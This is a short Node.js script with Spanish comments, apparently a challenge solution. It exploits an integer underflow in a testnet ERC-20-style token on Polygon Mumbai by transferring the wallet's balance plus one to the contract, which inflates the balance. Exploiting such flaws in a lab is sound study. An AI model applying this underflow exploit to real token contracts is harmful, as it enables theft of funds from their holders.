ENV_NODE=require('dotenv').config();
const Web3 = require('web3');
const Provider = require('@truffle/hdwallet-provider');

const address = '0x601eaA885bF37D28906Ad58d7508cFa1Af10E754'; // la de mi billetera desde donde hice la instancia del contrato
const privateKey = ENV_NODE.parsed.privKey; // la clave privada de la billetera para poder firmar
const nodeUrl = `https://polygon-mumbai.g.alchemy.com/v2/${process.env.PROJECT_ID}`; // el nodo con que firmaré

const SCaddress = '0xdA6091014cCc826d6C8FFA93B13159EF73b4B2CD';
const abi = [{"inputs":[{"internalType":"uint256","name":"_initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x70a08231"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x18160ddd"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function","signature":"0xa9059cbb"}];

// token con underflow
const init3 = async () => {
    // creo provider con el nodo provisto y mi llave privada para poder hacer las firmas sin metamask
    const provider = await new Provider(privateKey, nodeUrl); 
    // genero la instancia web3
    const web3 = await new Web3(provider);
    // creo instancia del contrato para llamar a sus funciones
    const myContract = await new web3.eth.Contract(abi,SCaddress);
  
    var balance = await myContract.methods.balanceOf(address).call();
    balance=balance+1;
    console.log(`Old Balance: ${balance}`);
    await myContract.methods.transfer(SCaddress, balance).send({from:address});
    var balance = await myContract.methods.balanceOf(address).call();
    console.log(`New Balance: ${balance}`);

}
  
init3();